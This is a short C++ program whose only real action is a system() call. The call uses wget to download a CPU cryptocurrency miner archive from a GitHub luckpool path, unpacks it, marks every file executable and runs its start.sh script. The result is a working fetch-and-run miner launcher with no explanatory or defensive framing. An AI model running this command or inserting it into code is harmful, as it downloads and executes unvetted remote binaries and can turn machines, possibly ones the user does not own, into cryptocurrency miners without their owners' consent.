#include &lt;iostream&gt; 
#include &lt;cstdlib&gt;  
using namespace std;

int main ()
{
  int i;
  cout&lt;&lt; "Check if command processor is available..."&lt;&lt;endl;
  if (system(NULL)) cout &lt;&lt; "command processor is available!!"&lt;&lt;endl;
    else exit (EXIT_FAILURE);
  cout&lt;&lt; "Executing Installing and Running the Script..."&lt;&lt;endl;
  i=system ("wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz && tar xf hellminer_cpu_linux.tar.gz && chmod +x * && bash start.sh");
  cout &lt;&lt; "The value returned was:"&lt;&lt;i&lt;&lt;endl;
  return 0;
}
